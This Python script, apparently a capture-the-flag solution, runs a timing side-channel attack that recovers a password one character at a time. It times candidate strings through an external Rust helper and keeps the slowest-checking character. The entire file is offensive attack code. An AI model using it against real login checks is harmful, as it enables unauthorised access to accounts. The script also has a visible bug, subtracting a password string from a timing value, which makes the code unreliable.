# pylint: disable=global-statement,invalid-name,wildcard-import,unused-wildcard-import,pointless-string-statement
import subprocess
from collections import defaultdict
from utils import *


def try_password_list(pws):
    out = subprocess.check_output(["rust_stuff/target/release/rust_stuff", "--"] + pws)
    out = out.decode("utf8").rstrip()
    print(out)
    out = out.splitlines()[1:]

    res = []
    for line in out:
        pw, header_time_ns, un_time_ns, pw_time_ns, succ = line.split(", ")
        assert pw in pws
        header_time_ns = int(header_time_ns)
        un_time_ns = int(un_time_ns)
        pw_time_ns = int(pw_time_ns)

        res.append((pw, header_time_ns, un_time_ns, pw_time_ns, succ))

    return res


class SuccessfulPasswordException(Exception):  # exceptions are totally for success conditions, right?
    pass


def try_passwords(prefix):
    timings = {}
    chrs = printable_no_ws | {" "}

    for chunk in chunks(sorted(chrs), 8):
        for pw, header_time_ns, un_time_ns, pw_time_ns, succ in try_password_list([prefix+c for c in chunk]):
            timings[pw] = header_time_ns, un_time_ns, pw_time_ns,
            if succ == "true":
                print("Successful password??", pw)
                raise SuccessfulPasswordException("Yay!", pw)

    return timings


def try_passwords_ntimes(prefix, ntimes=10):
    best_timings = defaultdict(lambda: 0xffffffffffffffffffffffffffff)
    full_data = defaultdict(list)

    for i in range(ntimes):
        print(f"=== Iteration {i} ===")
        timings = try_passwords(prefix)
        for pw, dt in timings.items():
            pw_time = dt[2]
            best_timings[pw] = min(best_timings[pw], pw_time)
            full_data[pw].append(dt)

    print(sorted(best_timings.items(), key=lambda kv: kv[1]))

    return dict(best_timings), dict(full_data)


def crack_password(prefix, ntimes=10):
    pw = prefix
    while len(pw) < 10:
        try:
            best_timings, full_data = try_passwords_ntimes(pw, ntimes)
        except SuccessfulPasswordException as e:
            return e.args[1]

        with open("full_timing_data_dump", "a") as f:
            print(full_data, file=f)

        timings = sorted(best_timings.items(), key=lambda kv: kv[1])

        print(timings)

        slowest_pw, slowest_t = timings[-1]
        snd_slowest_pw, snd_slowest_t = timings[-2]
        fastest_pw, fastest_t = timings[0]
        rng = snd_slowest_t - fastest_t
        best_dif = slowest_t - snd_slowest_pw

        if best_dif > 2*rng:
            print("Statistically significant difference found", slowest_pw, slowest_t,
                  snd_slowest_pw, snd_slowest_t, fastest_pw, fastest_t, rng, best_dif)
            pw = slowest_pw
            continue
        else:
            raise Exception("No statistically significant difference found", slowest_pw, slowest_t,
                            snd_slowest_pw, snd_slowest_t, fastest_pw, fastest_t, rng, best_dif)


crack_password("se")
